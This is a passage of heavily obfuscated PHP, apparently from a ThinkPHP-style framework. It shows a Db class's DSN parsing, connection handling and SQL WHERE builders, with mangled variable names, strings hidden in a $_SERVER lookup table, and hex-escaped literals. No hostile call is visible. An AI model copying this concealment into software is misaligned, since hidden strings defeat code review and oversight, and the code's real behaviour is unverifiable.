$this->_listDataApply($ä’èÍÌÒ[$¯Í¦ÃĞ”[447]]); return $ä’èÍÌÒ; } public function reportStatus($œ˜Ÿ‡€¡) { $‚ÁµÉê =& $_SERVER[®»±”ó²]; $ù³”Îµ’ = array($‚ÁµÉê[477] => $œ˜Ÿ‡€¡[$‚ÁµÉê[477]]); $ËÂœçºª = Model($‚ÁµÉê[2168])->where($ù³”Îµ’)->field($‚ÁµÉê[2177])->find(); if (!$ËÂœçºª) { return !1; } $ìıÍÅ„ = array($‚ÁµÉê[830] => $œ˜Ÿ‡€¡[$‚ÁµÉê[830]]); if ($œ˜Ÿ‡€¡[$‚ÁµÉê[830]] == $‚ÁµÉê[2173] && $ËÂœçºª[$‚ÁµÉê[830]] == $‚ÁµÉê[2173]) { $ìıÍÅ„[$‚ÁµÉê[830]] = 0; } $ŞÒ¾œ« = Model($‚ÁµÉê[2168])->where($ù³”Îµ’)->save($ìıÍÅ„); if ($œ˜Ÿ‡€¡[$‚ÁµÉê[830]] == $‚ÁµÉê[521]) { if ($ËÂœçºª[$‚ÁµÉê[554]] != $‚ÁµÉê[231] && $this->shareFileMeta($ËÂœçºª[$‚ÁµÉê[554]])) { $this->shareFileMeta($ËÂœçºª[$‚ÁµÉê[554]], 0); } $this->remove($ËÂœçºª[$‚ÁµÉê[681]]); return !0; } if ($ŞÒ¾œ« && $œ˜Ÿ‡€¡[$‚ÁµÉê[830]] == $‚ÁµÉê[2173]) { $¨ßƒÊÇè = $ìıÍÅ„[$‚ÁµÉê[830]] == $‚ÁµÉê[2173] ? 1 : 0; $this->shareFileMeta($ËÂœçºª[$‚ÁµÉê[554]], $¨ßƒÊÇè); $this->removeByFile($ËÂœçºª[$‚ÁµÉê[554]]); } return $ŞÒ¾œ«; } private function removeByFile($ÏÕ¼º) { $È¶ñÕÌ» =& $_SERVER[®»±”ó²]; $é€ÊÃ• = Model($È¶ñÕÌ»[911])->where(array($È¶ñÕÌ»[554] => $ÏÕ¼º))->field($È¶ñÕÌ»[194])->select(); $ŞÑ»æØ = array_to_keyvalue($é€ÊÃ•, $È¶ñÕÌ»[12], $È¶ñÕÌ»[194]); $šáÍÚì‚ = array($È¶ñÕÌ»[194] => array($È¶ñÕÌ»[7], $ŞÑ»æØ), $È¶ñÕÌ»[575] => 1); $é€ÊÃ• = $this->where($šáÍÚì‚)->field($È¶ñÕÌ»[681])->select(); if (empty($é€ÊÃ•)) { return; } $š¡ğú»ä = array_to_keyvalue($é€ÊÃ•, $È¶ñÕÌ»[12], $È¶ñÕÌ»[681]); $this->remove($š¡ğú»ä); } private function shareFileMeta($Ú‚Æããµ, $‘Ó¬û¾ò = null) { $ûÆ‘ò† =& $_SERVER[®»±”ó²]; $†÷ùÀğ¾ = array($ûÆ‘ò†[554] => $Ú‚Æããµ, $ûÆ‘ò†[97] => $ûÆ‘ò†[2178]); if (is_null($‘Ó¬û¾ò)) { return Model($ûÆ‘ò†[2179])->where($†÷ùÀğ¾)->find(); } $†÷ùÀğ¾[$ûÆ‘ò†[452]] = $‘Ó¬û¾ò; Model($ûÆ‘ò†[2179])->add($†÷ùÀğ¾, array(), !0); } } goto BßÎê…‹â¼; cìºƒáºèø: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\145\161" => "\x3c\76", "\147\164" => "\76", "\x65\x67\x74" => "\x3e\75", "\154\164" => "\x3c", "\x65\154\x74" => "\x3c\x3d", "\x6e\157\164\x6c\x69\x6b\x65" => "\116\x4f\124\x20\114\111\x4b\x45", "\154\151\x6b\145" => "\114\x49\113\105", "\151\156" => "\x49\116", "\156\x6f\x74\151\156" => "\x4e\117\x54\x20\111\116", "\156\x6f\164\40\x69\156" => "\116\117\124\40\111\116", "\x62\x65\164\167\x65\145\156" => "\102\x45\x54\x57\105\105\116", "\156\157\164\142\145\164\167\x65\145\x6e" => "\x4e\x4f\124\40\x42\x45\x54\127\x45\x45\x4e", "\x6e\x6f\x74\x20\142\x65\164\167\145\x65\x6e" => "\x4e\x4f\124\x20\102\x45\124\x57\x45\x45\x4e"); protected $selectSql = "\x53\x45\114\x45\x43\124\45\x44\111\x53\124\x49\x4e\x43\x54\45\40\x25\106\x49\x45\114\x44\45\40\106\122\117\x4d\40\45\x54\x41\x42\x4c\105\x25\45\x4a\x4f\111\x4e\x25\x25\127\x48\105\x52\105\x25\45\x47\x52\117\125\120\45\x25\110\101\126\x49\x4e\x47\45\45\117\122\x44\105\x52\x25\x25\x4c\x49\x4d\x49\x54\x25\40\x25\125\116\x49\x4f\x4e\x25\x25\x43\x4f\x4d\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $Éï¦İã = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[®»±”ó²][1047], $Éï¦İã); } public function factory($¢Ÿï†Ê¨ = '') { $Š¿Ÿşıâ =& $_SERVER[®»±”ó²]; $¢Ÿï†Ê¨ = $this->parseConfig($¢Ÿï†Ê¨); if (empty($¢Ÿï†Ê¨[$Š¿Ÿşıâ[1048]])) { think_exception(think_lang($Š¿Ÿşıâ[1049])); } $this->dbType = ucwords(strtolower($¢Ÿï†Ê¨[$Š¿Ÿşıâ[1048]])); $ê›½¬° = $Š¿Ÿşıâ[1050] . $this->dbType; if (class_exists($ê›½¬°)) { $¤½¥•Ğ = new $ê›½¬°($¢Ÿï†Ê¨); if ($Š¿Ÿşıâ[1051] != strtolower($¢Ÿï†Ê¨[$Š¿Ÿşıâ[1048]])) { $¤½¥•Ğ->dbType = strtoupper($this->dbType); } else { $¤½¥•Ğ->dbType = $this->_getDsnType($¢Ÿï†Ê¨[$Š¿Ÿşıâ[1003]]); } } else { think_exception(think_lang($Š¿Ÿşıâ[1052]) . $Š¿Ÿşıâ[1053] . $ê›½¬°); } return $¤½¥•Ğ; } public function __call($³ï‹¸Íƒ, $ŒŒòÇŒÇ) { if (method_exists($this, $³ï‹¸Íƒ)) { return call_user_func_array(array($this, $³ï‹¸Íƒ), $ŒŒòÇŒÇ); } } protected function _getDsnType($í·ÌÚØ) { $È«Ù»í‹ = explode($_SERVER[®»±”ó²][4], $í·ÌÚØ); $´ø“øËµ = strtoupper(trim($È«Ù»í‹[0])); return $´ø“øËµ; } private function parseConfig($ÔéŠËÈñ = '') { $È¤™è¯Ó =& $_SERVER[®»±”ó²]; if (!empty($ÔéŠËÈñ) && is_string($ÔéŠËÈñ)) { $ÔéŠËÈñ = $this->parseDSN($ÔéŠËÈñ); } elseif (is_array($ÔéŠËÈñ)) { $ÔéŠËÈñ = array_change_key_case($ÔéŠËÈñ); $ÔéŠËÈñ = array($È¤™è¯Ó[1048] => $ÔéŠËÈñ[$È¤™è¯Ó[1054]], $È¤™è¯Ó[975] => $ÔéŠËÈñ[$È¤™è¯Ó[1055]], $È¤™è¯Ó[976] => $ÔéŠËÈñ[$È¤™è¯Ó[1056]], $È¤™è¯Ó[973] => $ÔéŠËÈñ[$È¤™è¯Ó[1057]], $È¤™è¯Ó[974] => $ÔéŠËÈñ[$È¤™è¯Ó[1058]], $È¤™è¯Ó[21] => $ÔéŠËÈñ[$È¤™è¯Ó[1059]], $È¤™è¯Ó[1003] => $ÔéŠËÈñ[$È¤™è¯Ó[1060]], $È¤™è¯Ó[17] => isset($ÔéŠËÈñ[$È¤™è¯Ó[1061]]) ? $ÔéŠËÈñ[$È¤™è¯Ó[1061]] : array()); } elseif (empty($ÔéŠËÈñ)) { if (think_config($È¤™è¯Ó[1062]) && $È¤™è¯Ó[1051] != strtolower(think_config($È¤™è¯Ó[1063]))) { $ÔéŠËÈñ = $this->parseDSN(think_config($È¤™è¯Ó[1062])); } else { $ÔéŠËÈñ = array($È¤™è¯Ó[1048] => think_config($È¤™è¯Ó[1063]), $È¤™è¯Ó[975] => think_config($È¤™è¯Ó[1064]), $È¤™è¯Ó[976] => think_config($È¤™è¯Ó[1065]), $È¤™è¯Ó[973] => think_config($È¤™è¯Ó[1066]), $È¤™è¯Ó[974] => think_config($È¤™è¯Ó[1067]), $È¤™è¯Ó[21] => think_config($È¤™è¯Ó[326]), $È¤™è¯Ó[1003] => think_config($È¤™è¯Ó[1062]), $È¤™è¯Ó[17] => think_config($È¤™è¯Ó[1068])); } } return $ÔéŠËÈñ; } protected function initConnect($ÀÀ¹Ø“à = true) { if (1 == think_config($_SERVER[®»±”ó²][22])) { $this->_linkID = $this->multiConnect($ÀÀ¹Ø“à); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $­¦¤½Š¶ => $Î›Ó­‚ä) { $this->_linkID = $Î›Ó­‚ä; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($»Å”Íşü = false) { $Ç¹İ¹·­ =& $_SERVER[®»±”ó²]; static $ªõÊ«ß = array(); static $€Û¤¦ÜÚ = -1; if (empty($ªõÊ«ß)) { foreach ($this->config as $¨‰‰Ñ => $‚¢íØ±ä) { $ªõÊ«ß[$¨‰‰Ñ] = explode($Ç¹İ¹·­[50], $‚¢íØ±ä); } } if (think_config($Ç¹İ¹·­[1069])) { if ($»Å”Íşü || think_config($Ç¹İ¹·­[473]) === !0) { $¯““¾úë = floor(mt_rand(0, think_config($Ç¹İ¹·­[1070]) - 1)); $€Û¤¦ÜÚ = $¯““¾úë; } else { if (is_numeric(think_config($Ç¹İ¹·­[1071]))) { $¯““¾úë = think_config($Ç¹İ¹·­[1071]); } else { $¯““¾úë = floor(mt_rand(think_config($Ç¹İ¹·­[1070]), count($ªõÊ«ß[$Ç¹İ¹·­[973]]) - 1)); } } } else { $¯““¾úë = floor(mt_rand(0, count($ªõÊ«ß[$Ç¹İ¹·­[973]]) - 1)); $€Û¤¦ÜÚ = $¯““¾úë; } $¯““¾úë = $€Û¤¦ÜÚ !== -1 ? $€Û¤¦ÜÚ : $¯““¾úë; $Øü‘”ºØ = array($Ç¹İ¹·­[975] => isset($ªõÊ«ß[$Ç¹İ¹·­[975]][$¯““¾úë]) ? $ªõÊ«ß[$Ç¹İ¹·­[975]][$¯““¾úë] : $ªõÊ«ß[$Ç¹İ¹·­[975]][0], $Ç¹İ¹·­[976] => isset($ªõÊ«ß[$Ç¹İ¹·­[976]][$¯““¾úë]) ? $ªõÊ«ß[$Ç¹İ¹·­[976]][$¯““¾úë] : $ªõÊ«ß[$Ç¹İ¹·­[976]][0], $Ç¹İ¹·­[973] => isset($ªõÊ«ß[$Ç¹İ¹·­[973]][$¯““¾úë]) ? $ªõÊ«ß[$Ç¹İ¹·­[973]][$¯““¾úë] : $ªõÊ«ß[$Ç¹İ¹·­[973]][0], $Ç¹İ¹·­[974] => isset($ªõÊ«ß[$Ç¹İ¹·­[974]][$¯““¾úë]) ? $ªõÊ«ß[$Ç¹İ¹·­[974]][$¯““¾úë] : $ªõÊ«ß[$Ç¹İ¹·­[974]][0], $Ç¹İ¹·­[21] => isset($ªõÊ«ß[$Ç¹İ¹·­[21]][$¯““¾úë]) ? $ªõÊ«ß[$Ç¹İ¹·­[21]][$¯““¾úë] : $ªõÊ«ß[$Ç¹İ¹·­[21]][0], $Ç¹İ¹·­[1003] => isset($ªõÊ«ß[$Ç¹İ¹·­[1003]][$¯““¾úë]) ? $ªõÊ«ß[$Ç¹İ¹·­[1003]][$¯““¾úë] : $ªõÊ«ß[$Ç¹İ¹·­[1003]][0], $Ç¹İ¹·­[17] => isset($ªõÊ«ß[$Ç¹İ¹·­[17]][$¯““¾úë]) ? $ªõÊ«ß[$Ç¹İ¹·­[17]][$¯““¾úë] : $ªõÊ«ß[$Ç¹İ¹·­[17]][0]); return $this->connect($Øü‘”ºØ, $¯““¾úë); } public function parseDSN($Úû¬¿Ğ) { $Äœû—  =& $_SERVER[®»±”ó²]; if (empty($Úû¬¿Ğ)) { return !1; } $üìÎ“è¨ = parse_url($Úû¬¿Ğ); if ($üìÎ“è¨[$Äœû— [208]]) { $Çö¶ş‰ = array($Äœû— [1048] => $üìÎ“è¨[$Äœû— [208]], $Äœû— [975] => isset($üìÎ“è¨[$Äœû— [678]]) ? $üìÎ“è¨[$Äœû— [678]] : $Äœû— [12], $Äœû— [976] => isset($üìÎ“è¨[$Äœû— [1072]]) ? $üìÎ“è¨[$Äœû— [1072]] : $Äœû— [12], $Äœû— [973] => isset($üìÎ“è¨[$Äœû— [209]]) ? $üìÎ“è¨[$Äœû— [209]] : $Äœû— [12], $Äœû— [974] => isset($üìÎ“è¨[$Äœû— [210]]) ? $üìÎ“è¨[$Äœû— [210]] : $Äœû— [12], $Äœû— [21] => isset($üìÎ“è¨[$Äœû— [87]]) ? substr($üìÎ“è¨[$Äœû— [87]], 1) : $Äœû— [12]); } else { preg_match($Äœû— [1073], trim($Úû¬¿Ğ), $ŸË€Ÿš); $Çö¶ş‰ = array($Äœû— [1048] => $ŸË€Ÿš[1], $Äœû— [975] => $ŸË€Ÿš[2], $Äœû— [976] => $ŸË€Ÿš[3], $Äœû— [973] => $ŸË€Ÿš[4], $Äœû— [974] => $ŸË€Ÿš[5], $Äœû— [21] => $ŸË€Ÿš[6]); } $Çö¶ş‰[$Äœû— [1003]] = $Äœû— [12]; return $Çö¶ş‰; } protected function debug() { $•­²¸µ =& $_SERVER[®»±”ó²]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $•­²¸µ[1074]; if (think_config($•­²¸µ[1075])) { think_status($•­²¸µ[1076]); think_trace($this->queryStr . $•­²¸µ[1077] . think_status($•­²¸µ[24], $•­²¸µ[1076], 6) . $•­²¸µ[1078], $•­²¸µ[12], $•­²¸µ[1079]); } } protected function parseLock($ùßªáÅ¯ = false) { $À‚ûàÈÇ =& $_SERVER[®»±”ó²]; if (!$ùßªáÅ¯) { return $À‚ûàÈÇ[12]; } if ($À‚ûàÈÇ[1005] == $this->dbType) { return $À‚ûàÈÇ[1080]; } return $À‚ûàÈÇ[1081]; } protected function parseSet($èŠÈºêü) { $Åôä¡¬Ù =& $_SERVER[®»±”ó²]; foreach ($èŠÈºêü as $½Ïäá¦û => $ØÈ´¸Ê­) { if (is_array($ØÈ´¸Ê­) && $Åôä¡¬Ù[374] == $ØÈ´¸Ê­[0]) { $¼ÀÑÜ¥á[] = $this->parseKey($½Ïäá¦û) . $Åôä¡¬Ù[517] . $ØÈ´¸Ê­[1]; } elseif (is_scalar($ØÈ´¸Ê­) || is_null($ØÈ´¸Ê­)) { $¼ÀÑÜ¥á[] = $this->parseKey($½Ïäá¦û) . $Åôä¡¬Ù[517] . $this->parseValue($ØÈ´¸Ê­); } } return $Åôä¡¬Ù[1082] . implode($Åôä¡¬Ù[50], $¼ÀÑÜ¥á); } protected function bindParam($İ‰ÛÁ¶˜, $ÇÙÕ‚ŒÜ) { $this->bind[$_SERVER[®»±”ó²][4] . $İ‰ÛÁ¶˜] = $ÇÙÕ‚ŒÜ; } protected function parseBind($ø³õ»ú) { $ø³õ»ú = array_merge($this->bind, $ø³õ»ú); $this->bind = array(); return $ø³õ»ú; } function parseKey(&$îíÌÉ›Û, $©ÆÄöØ¥ = true) { if ($©ÆÄöØ¥) { $îíÌÉ›Û = $this->parseKeyCheck($îíÌÉ›Û); } return $îíÌÉ›Û; } function parseKeyCheck($øÄÅöÀˆ) { $Ïó·ÕÚ“ =& $_SERVER[®»±”ó²]; $øÄÅöÀˆ = trim($øÄÅöÀˆ); if (!preg_match($Ïó·ÕÚ“[1083], $øÄÅöÀˆ)) { think_exception($Ïó·ÕÚ“[1084] . $øÄÅöÀˆ); } return $øÄÅöÀˆ; } protected function parseValue($ÈÙÀÕÑ¼) { $¯”Ñ’›€ =& $_SERVER[®»±”ó²]; if (is_string($ÈÙÀÕÑ¼)) { $ÈÙÀÕÑ¼ = $¯”Ñ’›€[1044] . $this->escapeString($ÈÙÀÕÑ¼) . $¯”Ñ’›€[1044]; } elseif (isset($ÈÙÀÕÑ¼[0]) && is_string($ÈÙÀÕÑ¼[0]) && strtolower($ÈÙÀÕÑ¼[0]) == $¯”Ñ’›€[374]) { $ÈÙÀÕÑ¼ = $this->escapeString($ÈÙÀÕÑ¼[1]); } elseif (is_array($ÈÙÀÕÑ¼)) { $ÈÙÀÕÑ¼ = array_map(array($this, $¯”Ñ’›€[1045]), $ÈÙÀÕÑ¼); } elseif (is_bool($ÈÙÀÕÑ¼)) { $ÈÙÀÕÑ¼ = $ÈÙÀÕÑ¼ ? $¯”Ñ’›€[91] : $¯”Ñ’›€[231]; } elseif (is_null($ÈÙÀÕÑ¼)) { $ÈÙÀÕÑ¼ = $¯”Ñ’›€[106]; } return $ÈÙÀÕÑ¼; } protected function parseField($şĞƒ·¨ë) { $Àƒ˜¥ı =& $_SERVER[®»±”ó²]; if (is_string($şĞƒ·¨ë) && strpos($şĞƒ·¨ë, $Àƒ˜¥ı[50])) { $şĞƒ·¨ë = explode($Àƒ˜¥ı[50], $şĞƒ·¨ë); } if (is_array($şĞƒ·¨ë)) { $ÀññÁÛÎ = array(); foreach ($şĞƒ·¨ë as $˜ïÄßˆ¡ => $êÈöÀµ¶) { if (!is_numeric($˜ïÄßˆ¡)) { $ÀññÁÛÎ[] = $this->parseKey($˜ïÄßˆ¡, !1) . $Àƒ˜¥ı[1085] . $this->parseKey($êÈöÀµ¶); } else { $ÀññÁÛÎ[] = $this->parseKey($êÈöÀµ¶); } } $¾ıáä© = implode($Àƒ˜¥ı[50], $ÀññÁÛÎ); } elseif (is_string($şĞƒ·¨ë) && !empty($şĞƒ·¨ë)) { $¾ıáä© = $şĞƒ·¨ë; } else { $¾ıáä© = $Àƒ˜¥ı[223]; } return $¾ıáä©; } protected function parseTable($„†÷ºŠ‰) { $±Ó¢×Ä» =& $_SERVER[®»±”ó²]; if (is_array($„†÷ºŠ‰)) { $ßÖ°ÃÃ = array(); foreach ($„†÷ºŠ‰ as $…ßöÂÌ => $Ÿ‰«é’) { if (!is_numeric($…ßöÂÌ)) { $ßÖ°ÃÃ[] = $this->parseKey($…ßöÂÌ) . $±Ó¢×Ä»[53] . $this->parseKey($Ÿ‰«é’); } else { $ßÖ°ÃÃ[] = $this->parseKey($…ßöÂÌ); } } $„†÷ºŠ‰ = $ßÖ°ÃÃ; } elseif (is_string($„†÷ºŠ‰)) { if (strstr($„†÷ºŠ‰, $±Ó¢×Ä»[53])) { return $„†÷ºŠ‰; } $„†÷ºŠ‰ = explode($±Ó¢×Ä»[50], $„†÷ºŠ‰); array_walk($„†÷ºŠ‰, array($this, $±Ó¢×Ä»[993])); } return $±Ó¢×Ä»[987] . trim(implode($±Ó¢×Ä»[1086], $„†÷ºŠ‰), $±Ó¢×Ä»[463]) . $±Ó¢×Ä»[987]; } protected function parseWhere($úæ‰Ç³Ì) { $Ú¿¤Ü– =& $_SERVER[®»±”ó²]; $«Èõû³ = $Ú¿¤Ü–[12]; if (is_string($úæ‰Ç³Ì)) { $«Èõû³ = $úæ‰Ç³Ì; } else { $¬è”Œ¡ò = isset($úæ‰Ç³Ì[$Ú¿¤Ü–[1087]]) ? strtoupper($úæ‰Ç³Ì[$Ú¿¤Ü–[1087]]) : $Ú¿¤Ü–[12]; if (in_array($¬è”Œ¡ò, array($Ú¿¤Ü–[1088], $Ú¿¤Ü–[1089], $Ú¿¤Ü–[1090]))) { $¬è”Œ¡ò = $Ú¿¤Ü–[53] . $¬è”Œ¡ò . $Ú¿¤Ü–[53]; unset($úæ‰Ç³Ì[$Ú¿¤Ü–[1087]]); } else { $¬è”Œ¡ò = $Ú¿¤Ü–[1091]; } foreach ($úæ‰Ç³Ì as $Æìõ¬†î => $–‘ÑƒÎ¼) { $«Èõû³ .= $Ú¿¤Ü–[357]; if (is_numeric($Æìõ¬†î)) { $Æìõ¬†î = $Ú¿¤Ü–[1092]; } if (0 === strpos($Æìõ¬†î, $Ú¿¤Ü–[11])) { $«Èõû³ .= $this->parseThinkWhere($Æìõ¬†î, $–‘ÑƒÎ¼); } else { if (!preg_match($Ú¿¤Ü–[1093], trim($Æìõ¬†î))) { think_exception(think_lang($Ú¿¤Ü–[1094]) . $Ú¿¤Ü–[4] . $Æìõ¬†î); } $ÇƒëÌ¸ = is_array($–‘ÑƒÎ¼) && isset($–‘ÑƒÎ¼[$Ú¿¤Ü–[1095]]); $Æìõ¬†î = trim($Æìõ¬†î); if (strpos($Æìõ¬†î, $Ú¿¤Ü–[215])) { $İò†Ôáà = explode($Ú¿¤Ü–[215], $Æìõ¬†î); $ß‘°İè = array(); foreach ($İò†Ôáà as $îóÊë±„ => $±Õë¡Óğ) { $¬Ì“ç¹š = $ÇƒëÌ¸ ? $–‘ÑƒÎ¼[$îóÊë±„] : $–‘ÑƒÎ¼; $ß‘°İè[] = $Ú¿¤Ü–[340] . $this->parseWhereItem($this->parseKey($±Õë¡Óğ), $¬Ì“ç¹š) . $Ú¿¤Ü–[992]; } $«Èõû³ .= implode($Ú¿¤Ü–[1096], $ß‘°İè); } elseif (strpos($Æìõ¬†î, $Ú¿¤Ü–[287])) { $İò†Ôáà = explode($Ú¿¤Ü–[287], $Æìõ¬†î); $ß‘°İè = array(); foreach ($İò†Ôáà as $îóÊë±„ => $±Õë¡Óğ) { $¬Ì“ç¹š = $ÇƒëÌ¸ ? $–‘ÑƒÎ¼[$îóÊë±„] : $–‘ÑƒÎ¼; $ß‘°İè[] = $Ú¿¤Ü–[340] . $this->parseWhereItem($this->parseKey($±Õë¡Óğ), $¬Ì“ç¹š) . $Ú¿¤Ü–[992]; } $«Èõû³ .= implode($Ú¿¤Ü–[1091], $ß‘°İè); } else { $«Èõû³ .= $this->parseWhereItem($this->parseKey($Æìõ¬†î), $–‘ÑƒÎ¼); } } $«Èõû³ .= $Ú¿¤Ü–[358] . $¬è”Œ¡ò; } $«Èõû³ = substr($«Èõû³, 0, -strlen($¬è”Œ¡ò)); } return empty($«Èõû³) ? $Ú¿¤Ü–[12] : $Ú¿¤Ü–[1097] . $«Èõû³; } protected function parseWhereItem($¤¾ŒçŒ¸, $‡ŞÍãë) { $·±ñĞÀî =& $_SERVER[®»±”ó²]; $ÄÕÑÜ¸ = $·±ñĞÀî[12]; if (is_array($‡ŞÍãë)) { if (is_string($‡ŞÍãë[0])) { $èøĞ­»ø = strtolower($‡ŞÍãë[0]); if (in_array($‡ŞÍãë[0], array($·±ñĞÀî[517], $·±ñĞÀî[1098], $·±ñĞÀî[1099], $·±ñĞÀî[1100], $·±ñĞÀî[1101], $·±ñĞÀî[1102]))) { $ÄÕÑÜ¸ .= $¤¾ŒçŒ¸ . $·±ñĞÀî[53] . $‡ŞÍãë[0] . $·±ñĞÀî[53] . $this->parseValue($‡ŞÍãë[1]); } elseif (preg_match($·±ñĞÀî[1103], $‡ŞÍãë[0])) { $ÄÕÑÜ¸ .= $¤¾ŒçŒ¸ . $·±ñĞÀî[53] . $this->exp[$èøĞ­»ø] . $·±ñĞÀî[53] . $this->parseValue($‡ŞÍãë[1]); } elseif (preg_match($·±ñĞÀî[1104], $‡ŞÍãë[0])) { if (is_array($‡ŞÍãë[1])) { $Ç¸Ë·Ùò = isset($‡ŞÍãë[2]) ? strtoupper($‡ŞÍãë[2]) : $·±ñĞÀî[1089]; if (in_array($Ç¸Ë·Ùò, array($·±ñĞÀî[1088], $·±ñĞÀî[1089], $·±ñĞÀî[1090]))) { $Èáà¢Šö = array(); foreach ($‡ŞÍãë[1] as $‹É¡Ó) { $Èáà¢Šö[] = $¤¾ŒçŒ¸ . $·±ñĞÀî[53] . $this->exp[$èøĞ­»ø] . $·±ñĞÀî[53] . $this->parseValue($‹É¡Ó); } $ÄÕÑÜ¸ .= $·±ñĞÀî[340] . implode($·±ñĞÀî[53] . $Ç¸Ë·Ùò . $·±ñĞÀî[53], $Èáà¢Šö) . $·±ñĞÀî[992]; } } else { $ÄÕÑÜ¸ .= $¤¾ŒçŒ¸ . $·±ñĞÀî[53] . $this->exp[$èøĞ­»ø] . $·±ñĞÀî[53] . $this->parseValue($‡ŞÍãë[1]); } } elseif ($·±ñĞÀî[374] == $èøĞ­»ø) { $ÄÕÑÜ¸ .= $·±ñĞÀî[990] . $¤¾ŒçŒ¸ . $·±ñĞÀî[53] . $‡ŞÍãë[1] . $·±ñĞÀî[1105]; } elseif (preg_match($·±ñĞÀî[1106], $‡ŞÍãë[0])) { $ÄÕÑÜ¸ .= $‡ŞÍãë[0]; } elseif (preg_match($·±ñĞÀî[1107], $‡ŞÍãë[0])) { if (isset($‡ŞÍãë[2]) && $·±ñĞÀî[374] == $‡ŞÍãë[2]) { $ÄÕÑÜ¸ .= $¤¾ŒçŒ¸ . $·±ñĞÀî[53] . $this->exp[$èøĞ­»ø] . $·±ñĞÀî[53] . $‡ŞÍãë[1]; } else { if (is_string($‡ŞÍãë[1])) { $‡ŞÍãë[1] = explode($·±ñĞÀî[50], $‡ŞÍãë[1]); } $ôöÎ¹ = implode($·±ñĞÀî[50], $this->parseValue($‡ŞÍãë[1])); $ÄÕÑÜ¸ .= $¤¾ŒçŒ¸ . $·±ñĞÀî[53] . $this->exp[$èøĞ­»ø] . $·±ñĞÀî[990] . $ôöÎ¹ . $·±ñĞÀî[992]; } } elseif (preg_match($·±ñĞÀî[1108], $‡ŞÍãë[0])) { $²å––àñ = is_string($‡ŞÍãë[1]) ? explode($·±ñĞÀî[50], $‡ŞÍãë[1]) : $‡ŞÍãë[1]; $ÄÕÑÜ¸ .= $·±ñĞÀî[990] . $¤¾ŒçŒ¸ . $·±ñĞÀî[53] . $this->exp[$èøĞ­»ø] . $·±ñĞÀî[53] . $this->parseValue($²å––àñ[0]) . $·±ñĞÀî[1091] . $this->parseValue($²å––àñ[1]) . $·±ñĞÀî[358]; } else { think_exception(think_lang($·±ñĞÀî[1094]) . $·±ñĞÀî[4] . $‡ŞÍãë[0]); } } else { $Çè±İÁ× = count($‡ŞÍãë); $Ç°»ó = $·±ñĞÀî[12]; if (is_string($‡ŞÍãë[$Çè±İÁ× - 1])) { $Ç°»ó = isset($‡ŞÍãë[$Çè±İÁ× - 1]) ? strtoupper($‡ŞÍãë[$Çè±İÁ× - 1]) : $·±ñĞÀî[12]; if (in_array($Ç°»ó, array($·±ñĞÀî[1088], $·±ñĞÀî[1089], $·±ñĞÀî[1090]))) { $Çè±İÁ× = $Çè±İÁ× - 1; } } else { $Ç°»ó = $·±ñĞÀî[1088]; } for ($É…‚””ã = 0; $É…‚””ã < $Çè±İÁ×; $É…‚””ã++) { $²å––àñ = is_array($‡ŞÍãë[$É…‚””ã]) ? $‡ŞÍãë[$É…‚””ã][1] : $‡ŞÍãë[$É…‚””ã]; if ($·±ñĞÀî[374] == strtolower($‡ŞÍãë[$É…‚””ã][0])) { $ÄÕÑÜ¸ .= $·±ñĞÀî[340] . $¤¾ŒçŒ¸ . $·±ñĞÀî[53] . $²å––àñ . $·±ñĞÀî[1105] . $Ç°»ó . $·±ñĞÀî[53]; } else { $©·é‘şÒ = is_array($‡ŞÍãë[$É…‚””ã]) ? $this->exp[strtolower($‡ŞÍãë[$É…‚””ã][0])] : $·±ñĞÀî[517]; if (!$©·é‘şÒ && is_array($‡ŞÍãë[$É…‚””ã]) && in_array($‡ŞÍãë[$É…‚””ã][0], array($·±ñĞÀî[517], $·±ñĞÀî[1098], $·±ñĞÀî[1099], $·±ñĞÀî[1100], $·±ñĞÀî[1101], $·±ñĞÀî[1102]))) { $©·é‘şÒ = $‡ŞÍãë[$É…‚””ã][0]; } $ÄÕÑÜ¸ .= $·±ñĞÀî[340] . $¤¾ŒçŒ¸ . $·±ñĞÀî[53] . $©·é‘şÒ . $·±ñĞÀî[53] . $this->parseValue($²å––àñ) . $·±ñĞÀî[1105] . $Ç°»ó . $·±ñĞÀî[53]; } } $ÄÕÑÜ¸ = substr($ÄÕÑÜ¸, 0, -4); } } else { $ÄÕÑÜ¸ .= $¤¾ŒçŒ¸ . $·±ñĞÀî[1109] . $this->parseValue($‡ŞÍãë); } return $ÄÕÑÜ¸; } protected function parseThinkWhere($Üó‘Ã©», $°ƒúŒ) { $»£ğÓÛÕ =& $_SERVER[®»±”ó²]; $¼úµ¬ë = $»£ğÓÛÕ[12]; switch ($Üó‘Ã©») { case $»£ğÓÛÕ[429]: $¼úµ¬ë = $°ƒúŒ; break; case $»£ğÓÛÕ[1092]: $¼úµ¬ë = is_string($°ƒúŒ) ? $°ƒúŒ : substr($this->parseWhere($°ƒúŒ), 6); break; case $»£ğÓÛÕ[1110]: parse_str($°ƒúŒ, $¯ĞÂ‹è); if (isset($¯ĞÂ‹è[$»£ğÓÛÕ[1087]])) { $»Œ…ï = $»£ğÓÛÕ[53] . strtoupper($¯ĞÂ‹è[$»£ğÓÛÕ[1087]]) . $»£ğÓÛÕ[53]; unset($¯ĞÂ‹è[$»£ğÓÛÕ[1087]]); } else { $»Œ…ï = $»£ğÓÛÕ[1091]; } $§İ˜ı = array(); foreach ($¯ĞÂ‹è as $§ÃÇ¼Œı => $¢·Ş÷ºõ) { $§İ˜ı[] = $this->parseKey($§ÃÇ¼Œı) . $»£ğÓÛÕ[1109] . $this->parseValue($¢·Ş÷ºõ); } $¼úµ¬ë = implode($»Œ…ï, $§İ˜ı); break; } return $¼úµ¬ë; } protected function parseLimit($Ó·Çê‹) { $—‘ëú°Ü =& $_SERVER[®»±”ó²]; return 